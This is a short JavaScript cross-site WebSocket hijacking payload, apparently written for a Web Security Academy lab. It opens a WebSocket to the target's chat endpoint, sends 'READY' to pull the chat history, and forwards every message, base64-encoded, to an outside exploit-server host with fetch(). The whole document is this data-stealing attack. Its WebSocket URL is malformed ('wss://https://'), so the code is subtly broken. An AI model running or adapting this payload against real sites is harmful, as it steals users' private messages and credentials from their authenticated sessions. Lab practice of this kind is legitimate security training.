var ws = new WebSocket(
  "wss://https://0a54003704c409e9810a7aae002800e4.web-security-academy.net/chat"
);

ws.onopen = function () {
  ws.send("READY");
};

ws.onmessage = function (event) {
  fetch(
    "https://exploit-0a8a008c045f09ed8127795d01940006.exploit-server.net/message=" + btoa(event.data)
  );

};
